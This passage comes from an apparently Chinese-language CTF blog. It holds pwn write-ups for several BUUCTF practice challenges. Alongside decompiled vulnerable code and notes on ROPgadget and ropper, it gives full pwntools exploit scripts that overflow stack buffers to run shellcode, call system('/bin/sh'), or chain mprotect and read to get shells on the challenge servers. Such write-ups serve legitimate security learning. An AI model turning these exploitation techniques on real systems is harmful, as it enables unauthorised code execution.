system<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x04f440</span>
binsh<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x1b3e9a</span>
sh<span class="token punctuation">.</span><span class="token function">recv</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>b<span class="token char">'1'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span><span class="token function">recv</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>padding<span class="token operator">+</span><span class="token function">p64</span><span class="token punctuation">(</span>rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p64</span><span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p64</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p64</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span><span class="token function">interactive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little
RELRO<span class="token operator">:</span>    Partial RELRO
Stack<span class="token operator">:</span>    No canary found
NX<span class="token operator">:</span>       NX unknown <span class="token operator">-</span> GNU_STACK missing
PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span>
Stack<span class="token operator">:</span>    Executable
RWX<span class="token operator">:</span>      Has RWX segments<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> text<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"tell me your name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> <span class="token number">0x64uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"wow~ nice name!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What do you want to say to me?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>text在栈上，栈溢出</p>
<p>但是呢第一想法是构造ROP链，但是在ROPgadget的时候发现几乎没有适合的rop，所以只能换个想法了</p>
<p>发现name可写，又有rwx，因此就直接写shellcode，之后ret就行了</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">from pwn import<span class="token operator">*</span>
binary<span class="token operator">=</span><span class="token char">'./ciscn_2019_n_5'</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">sh</span><span class="token expression"><span class="token operator">=</span><span class="token function">process</span><span class="token punctuation">(</span>binary<span class="token punctuation">)</span></span></span>
sh<span class="token operator">=</span><span class="token function">remote</span><span class="token punctuation">(</span><span class="token char">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29953</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span><span class="token function">ELF</span><span class="token punctuation">(</span>binary<span class="token punctuation">)</span>

ret<span class="token operator">=</span><span class="token number">0x0000601080</span>
<span class="token function">context</span><span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token char">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token char">'linux'</span><span class="token punctuation">)</span>  
shellcode<span class="token operator">=</span><span class="token keyword">asm</span><span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token function">sh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 

sh<span class="token punctuation">.</span><span class="token function">recvuntil</span><span class="token punctuation">(</span>b<span class="token char">'tell me your name\n'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span><span class="token function">recvuntil</span><span class="token punctuation">(</span>b<span class="token char">'What do you want to say to me?'</span><span class="token punctuation">)</span>
pal<span class="token operator">=</span><span class="token number">0x28</span><span class="token operator">*</span>b<span class="token char">'a'</span><span class="token operator">+</span><span class="token function">p64</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>pal<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span><span class="token function">interactive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这道题学到了</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">context</span><span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token char">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token char">'linux'</span><span class="token punctuation">)</span> 
shellcode<span class="token operator">=</span><span class="token keyword">asm</span><span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token function">sh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>首先导入pwntool模块，之后便可以有自助shellcode，虽然我之前都是手写的但是容易挂</p>
<h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little
RELRO<span class="token operator">:</span>    Partial RELRO
Stack<span class="token operator">:</span>    No canary found
NX<span class="token operator">:</span>       NX enabled
PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同<code>ciscn_2019_c_1</code></p>
<h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> '<span class="token operator">/</span>mnt<span class="token operator">/</span>hgfs<span class="token operator">/</span>shared<span class="token operator">/</span>ctf<span class="token operator">-</span>learn<span class="token operator">/</span><span class="token number">3</span>dsctf_2016'
    Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little
    RELRO<span class="token operator">:</span>    Partial RELRO
    Stack<span class="token operator">:</span>    No canary found
    NX<span class="token operator">:</span>       NX enabled
    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c">bamboo@bamboo<span class="token operator">-</span>virtual<span class="token operator">-</span>machine<span class="token operator">:</span><span class="token operator">/</span>mnt<span class="token operator">/</span>hgfs<span class="token operator">/</span>shared<span class="token operator">/</span>ctf<span class="token operator">-</span>learn$ ROPgadget <span class="token operator">--</span>binary <span class="token number">3</span>dsctf_2016 <span class="token operator">--</span>only <span class="token char">'int'</span>
Gadgets information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
<span class="token number">0x0806d8a5</span> <span class="token operator">:</span> <span class="token keyword">int</span> <span class="token number">0x80</span>

Unique gadgets found<span class="token operator">:</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现ROPgadget有些东西找不出来这时候就要使用ropper函数</p>
<h3 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h3><p>Roopper 的语法基本上由命令和选项组成。下面是一些常用的 Roopper 命令和选项的示例：</p>
<ol>
<li><p>分析二进制文件：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">ropper <span class="token operator">-</span>f <span class="token operator">&lt;</span>binary_file<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>搜索特定指令：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">ropper <span class="token operator">-</span>f <span class="token operator">&lt;</span>binary_file<span class="token operator">></span> <span class="token operator">--</span>search <span class="token operator">&lt;</span>instruction<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>根据模式匹配搜索：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">ropper <span class="token operator">-</span>f <span class="token operator">&lt;</span>binary_file<span class="token operator">></span> <span class="token operator">--</span>search <span class="token operator">&lt;</span>pattern<span class="token operator">></span> <span class="token operator">--</span>pattern<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>过滤和排序指令：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">ropper <span class="token operator">-</span>f <span class="token operator">&lt;</span>binary_file<span class="token operator">></span> <span class="token operator">--</span>opcode <span class="token operator">&lt;</span>opcode<span class="token operator">></span> <span class="token operator">--</span>type <span class="token operator">&lt;</span>type<span class="token operator">></span> <span class="token operator">--</span>sort <span class="token operator">&lt;</span>sort_type<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>生成 ROP 链：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">ropper <span class="token operator">-</span>f <span class="token operator">&lt;</span>binary_file<span class="token operator">></span> <span class="token operator">--</span>chain <span class="token string">"&lt;gadget1>;&lt;gadget2>;..."</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>显示帮助信息：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">ropper <span class="token operator">--</span>help<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p>上述命令中的 <code>&lt;binary_file&gt;</code> 是要分析的二进制文件的路径。</p>
<p>其中，该程序是 32 位，所以我们需要使得</p>
<ul>
<li>系统调用号，即 eax 应该为 0xb      <strong>说明即使是32位的在执行syscall时的参数仍然在寄存器中</strong></li>
<li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li>
<li>第二个参数，即 ecx 应该为 0</li>
<li>第三个参数，即 edx 应该为 0</li>
</ul>
<p>但是呢没有&#x2F;bin&#x2F;sh所以在栈上构造</p>
<p>所以泄露栈？</p>
<p>但是我们发现好像没法玩，因为什么都没有</p>
<p>这时候是在搞不了发现原来有后门函数，真的绷不住了</p>
<p>首先shift+F12找到有个flag.txt字符串，然后ctrl+x找到调用的函数</p>
<img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132059132.png" alt="image-20240306192130678" style="zoom:50%;" />

<p>然后发现只有fget，实在是不会了，该flag位置在0x80ECA2D然后ctrl+s有rw权限因此读flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132059133.png" alt="image-20240306193620444"></p>
<p>但是有个问题，我发现<img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132059134.png" alt="image-20240306195251819"></p>
<p>他根本没有push ebp，靠！</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">from pwn import<span class="token operator">*</span>
from LibcSearcher import<span class="token operator">*</span>
<span class="token function">context</span><span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token char">'i386'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token char">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token char">'debug'</span><span class="token punctuation">)</span>
sh<span class="token operator">=</span><span class="token function">remote</span><span class="token punctuation">(</span><span class="token char">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26826</span><span class="token punctuation">)</span>

flag_addr<span class="token operator">=</span><span class="token number">0x80ECA2D</span>
backdoor<span class="token operator">=</span><span class="token number">0x80489A0</span>
printf<span class="token operator">=</span><span class="token number">0x0804f0a0</span>
exit<span class="token operator">=</span><span class="token number">0x0804e660</span>
pal<span class="token operator">=</span><span class="token number">0x2d</span><span class="token operator">*</span>b<span class="token char">'a'</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>printf<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>exit<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>pal<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span><span class="token function">interactive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="二解"><a href="#二解" class="headerlink" title="二解"></a>二解</h3><p>我一开始的思路是利用main函数里的gets造成溢出，覆盖返回地址去读出flag，然后利用get_secret函数的输入点造成溢出然后覆盖返回地址到write函数的地址，打印出unk_80CF91B里的flag的内容，但是后来在百度fgets的用法的时候，发现它能够避免造成溢出，而且fl4g在bss段，没有ret指令可以继续控制程序。</p>
<p>后来我在程序了发现了mprotect函数，可以用它来修改我们内存栈的权限，让它可读可写可执行，接着让写入shellcode，然后执行获取shell，这题的做法跟get_started_3dsctf_2016这题类似</p>
<p>由于需要利用ret指令控制程序，所以这里需要借助用来设置三个参数的三个寄存器命令，p3_ret&#x3D;0x806fcc8</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">ROPgadget <span class="token operator">--</span>binary not_the_same_3dsctf_2016 <span class="token operator">--</span>only <span class="token string">"pop|ret"</span><span class="token operator">|</span>grep pop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132059135.png" alt="在这里插入图片描述"></p>
<p>ctrl+s调出程序的段表，将.got.plt段改为可读可写可执行,addr&#x3D;0x80eb000</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">payload  <span class="token operator">=</span><span class="token char">'a'</span><span class="token operator">*</span><span class="token number">0x2d</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>mprotect<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>p3_ret<span class="token punctuation">)</span>
payload <span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>


<p>将返回地址填写成read函数，设置read函数的参数，之后将返回地址改为我们修改为可读可写可执行的地址，最好读入shellcode</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">payload <span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>p3_ret<span class="token punctuation">)</span>

payload <span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
r<span class="token punctuation">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>完整EXP</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">from pwn import<span class="token operator">*</span>

r<span class="token operator">=</span><span class="token function">remote</span><span class="token punctuation">(</span><span class="token char">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29651</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span><span class="token function">ELF</span><span class="token punctuation">(</span><span class="token char">'not_the_same_3dsctf_2016'</span><span class="token punctuation">)</span>
read_addr<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token char">'read'</span><span class="token punctuation">]</span>
mprotect<span class="token operator">=</span><span class="token number">0x806ED40</span>
addr<span class="token operator">=</span><span class="token number">0x80eb000</span>
p3_ret<span class="token operator">=</span><span class="token number">0x806fcc8</span>

shellcode<span class="token operator">=</span><span class="token keyword">asm</span><span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token function">sh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

payload  <span class="token operator">=</span><span class="token char">'a'</span><span class="token operator">*</span><span class="token number">0x2d</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>mprotect<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>p3_ret<span class="token punctuation">)</span>
payload <span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span>

payload <span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>p3_ret<span class="token punctuation">)</span>

payload <span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span>

r<span class="token punctuation">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>

r<span class="token punctuation">.</span><span class="token function">interactive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp看的不是很懂，但是大概理解意思</p>
<h2 id="iscn-2019-ne-5"><a href="#iscn-2019-ne-5" class="headerlink" title="iscn_2019_ne_5"></a>iscn_2019_ne_5</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little
RELRO<span class="token operator">:</span>    Partial RELRO
Stack<span class="token operator">:</span>    No canary found
NX<span class="token operator">:</span>       NX enabled
PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在做这道题的时候，发现自己32位传参还是有一定的不理解</p>
<p>32位传参：</p>
<p>一般是依靠类似于</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">垃圾数据<span class="token operator">+</span>ret_addr<span class="token operator">+</span>某返回地址<span class="token punctuation">(</span>bbbb<span class="token punctuation">)</span><span class="token operator">+</span>arg1<span class="token operator">+</span>arg2<span class="token operator">+</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这样子的，因为ret_addr的后面要紧跟某一个要返回的地址，这个东西编译器会处理好的，但是如果想要一次调用两个以上的函数，应该要先弹栈</p>
<p>例如:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">system_addr<span class="token operator">+</span>pop<span class="token operator">|</span>ret<span class="token operator">+</span><span class="token operator">/</span>bin<span class="token operator">/</span>sh_addr<span class="token operator">+</span>下一个函数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如此如此</p>
<p>还有一个问题便是</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>src <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ida里的一个语句，我点进去src的时候发现src在栈上，但是src是一个地址，所以我很好奇src到底是在栈上还是在栈上的一个地址，其实src就是在栈上，但是其指向的不一定在栈上</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">GetFlag</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>src<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> dest<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-48h] BYREF</span>
  <span class="token keyword">char</span> v3<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+4h] [ebp-44h] BYREF</span>

  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>dest <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The flag is your log:%s\n"</span><span class="token punctuation">,</span> dest<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>src可控显然栈溢出</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">bamboo@bamboo<span class="token operator">-</span>virtual<span class="token operator">-</span>machine<span class="token operator">:</span><span class="token operator">/</span>mnt<span class="token operator">/</span>hgfs<span class="token operator">/</span>shared<span class="token operator">/</span>ctf<span class="token operator">-</span>learn$ ROPgadget <span class="token operator">--</span>binary ciscn_2019_ne_5 <span class="token operator">--</span>string <span class="token char">'sh'</span>
Strings information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
<span class="token number">0x080482ea</span> <span class="token operator">:</span> sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>找到sh，幸运的是sh是flussh的sh其后面\x00截断，不然打不了</p>
<h2 id="2018-rop"><a href="#2018-rop" class="headerlink" title="2018_rop"></a>2018_rop</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little
RELRO<span class="token operator">:</span>    Partial RELRO
Stack<span class="token operator">:</span>    No canary found
NX<span class="token operator">:</span>       NX enabled
PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">136</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+10h] [ebp-88h] BYREF</span>

  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>溢出6个地址的长度，1个ebp所以只有一次只有5个，返回地址改main，4个地址长度</p>
<p>那么这里啥都没有，所以先泄露libc版本，然后system(‘’&#x2F;bin&#x2F;sh’)即可</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">from pwn import<span class="token operator">*</span>
from LibcSearcher import<span class="token operator">*</span>
sh<span class="token operator">=</span><span class="token function">remote</span><span class="token punctuation">(</span><span class="token char">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28188</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span><span class="token function">ELF</span><span class="token punctuation">(</span><span class="token char">'./2018_rop'</span><span class="token punctuation">)</span>
